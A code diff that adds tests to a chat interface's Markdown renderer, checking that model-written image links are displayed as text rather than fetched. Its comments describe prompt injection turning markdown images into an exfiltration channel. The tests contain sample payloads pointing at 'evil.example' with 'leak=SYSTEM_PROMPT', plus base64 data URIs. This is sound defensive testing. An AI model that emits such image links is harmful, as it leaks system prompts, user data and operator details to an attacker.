@@ -74,3 +74,38 @@ describe('Markdown code block copy button (bug investigation #7)', () => {
     await waitFor(() => expect(screen.getByTitle(/Couldn't copy/)).toBeTruthy());
   });
 });
+
+// The text rendered here is the MODEL's, and a model that has read a tool result, a document or a
+// web page has been handed text an attacker may have written. An image is the one markdown construct
+// that reaches out on its own — no click, no consent — so `![](https://x/?q=<data>)` was an
+// exfiltration channel: not for the token, which never enters the DOM, but for anything the model can
+// put in a URL, plus the operator's IP and the moment they opened the page.
+//
+// The link handler had a scheme allow-list from the start. This is the same class with the safety
+// inverted, and the protection had gone to the channel that needs a click.
+describe('Markdown does not let the model make requests', () => {
+  it('a remote image is shown as text, not fetched', () => {
+    const { container } = render(<Markdown text={'![x](https://evil.example/b.png?leak=SYSTEM_PROMPT)'} />);
+    expect(container.querySelector('img'), 'an <img> here IS the request').toBeNull();
+    // Nothing is hidden from the operator. This used to assert the ALT text was present, which is true
+    // Whether or not the address is shown — and with an alt present the address was in fact dropped.
+    expect(container.querySelector('[title]')?.getAttribute('title')).toBe('https://evil.example/b.png?leak=SYSTEM_PROMPT');
+  });
+
+  // No image element is produced at all, and that is deliberate rather than blunt: react-markdown's
+  // Own sanitizer strips `data:` before this component runs (measured — the src arrives as ''), so a
+  // Branch permitting inline data images would read as a live allowance while never firing.
+  it('shows the address even when an alt is present — the common case', () => {
+    const { container } = render(<Markdown text={'![chart](https://evil.example/b.png?leak=DATA)'} />);
+    expect(container.textContent).toContain('chart');
+    expect(container.querySelector('[title]')?.getAttribute('title')).toContain('evil.example');
+  });
+
+  it('renders no <img> at all — everything reaching the handler is remote', () => {
+    for (const md of ['![y](data:image/png;base64,AAA)', '![z](data:text/html;base64,PHNjcmlwdD4=)', '![w](https://e.example/x.png)']) {
+      const { container } = render(<Markdown text={md} />);
+      expect(container.querySelector('img'), md).toBeNull();
+      cleanup();
+    }
+  });
+});
